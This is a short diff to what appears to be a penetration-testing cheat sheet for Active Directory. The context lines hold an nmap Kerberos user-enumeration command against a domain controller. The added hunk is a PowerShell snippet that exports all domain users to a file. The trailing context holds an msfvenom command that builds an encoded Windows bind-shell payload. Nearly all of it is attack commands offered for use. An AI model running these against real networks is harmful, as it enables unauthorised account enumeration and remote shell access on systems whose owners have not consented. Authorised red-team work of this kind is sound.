@@ -26,6 +26,20 @@ ENUM USERS DOMAIN-CONTROLLER
 nmap -p88 --script krb5-enum-users --script-args krb5-enumusers.realm="cyberspacekittens.local",userdb=/opt/userlist.txt <Domain Controller IP>
 ```
 
+EXPORT LIST DOMAIN-USERS
+```
+# store the results in an array.
+$results = net group "Domain Users" /domain
+
+# the size of the header and footer is always the same. select the data between these sections.
+$results = $results[8..($results.Length-3)]
+
+# replace the empty spaces with a comma. join on the comma, getting rid of blank lines.
+foreach($result in $results) { 
+    ($result -replace '\s+',',') -split ',' | ? { $_ } >> 'adusers.txt'
+}
+```
+
 MSF-PAYLOAD
 ```
 - msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python :: Windows
